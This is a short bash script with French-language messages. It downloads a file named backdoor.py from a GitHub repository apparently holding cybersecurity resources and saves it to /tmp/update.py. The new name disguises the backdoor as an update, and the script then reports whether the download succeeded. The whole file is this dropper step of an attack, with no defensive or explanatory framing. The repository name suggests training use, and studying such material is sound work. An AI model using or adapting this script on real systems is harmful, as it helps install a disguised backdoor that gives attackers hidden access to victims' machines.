#!/bin/bash

url="https://raw.githubusercontent.com/C0SB/ressources_cyber/main/scripts/backdoor.py"

destination="/tmp/update.py"

curl -o "$destination" "$url"

if [ $? -eq 0 ]; then
    echo "Téléchargement réussi vers $destination"
else
    echo "Échec du téléchargement. Veuillez vérifier l'URL et votre connexion Internet."
fi
